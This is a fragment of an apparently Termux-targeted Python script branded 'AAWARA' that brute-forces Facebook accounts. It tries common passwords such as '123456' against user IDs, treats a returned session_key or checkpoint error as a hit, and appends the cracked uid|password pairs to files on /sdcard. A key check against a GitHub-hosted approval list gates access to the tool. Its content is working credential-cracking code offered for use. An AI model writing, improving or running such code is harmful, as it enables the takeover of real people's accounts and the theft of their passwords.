...
\033[1;37m________  _______   ______  ______   ______  
\033[1;37m/        |/       \ /      |/      | /      \ 
\033[1;37m$$$$$$$$/ $$$$$$$  |$$$$$$/ $$$$$$/ /$$$$$$  |
\033[1;37m$$ |__    $$ |__$$ |  $$ |    $$ |  $$ |  $$/ 
\033[1;37m$$    |   $$    $$<   $$ |    $$ |  $$ |      
...
\x1b[1;92m═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━══━═━═━═
\033[1;92m[\033[1;92m\033[1;34m✔\033[1;92m]DEVELOPER      \033[1;91m\033[1;34m: \033[1;92  AAWARA 
[\033[1;92m\033[1;34m✔\033[1;92m]FACEBOOK       \033[1;91m\033[1;34m: \033[1;92m ERIIC TRICKER
    ...
    try:
        ...
        for pw in ["57273200","123456789","1234567","12345678","123456","first@last"]:
            ...
            if "session_key" in rp:
                print(f"\r\r{G}AAWARA😊OK {A}➤ {G}{uid} {A}•{G} {pw}")
                open("/sdcard/AAWARA-OLD-OK","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r{G}AAWARA😊OK {A}➤ {G}{uid} {A}•{G} {pw}")
                open("/sdcard/AAWARA-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
...
def Subscraption():
	...
	clear()
	print(logo)
	r1=requests.get("https://raw.githubusercontent.com/AAWARAx/F-1/main/APPROVAL.txt").text
	if key1 in r1:
		os.system('clear')
		print(logo)
		Main()
		...
		print(logo)
		print ("")
		print(" \033[1;32m AAWARA Toll Free BUT You Need Get Approved First\033[1;37m\n")
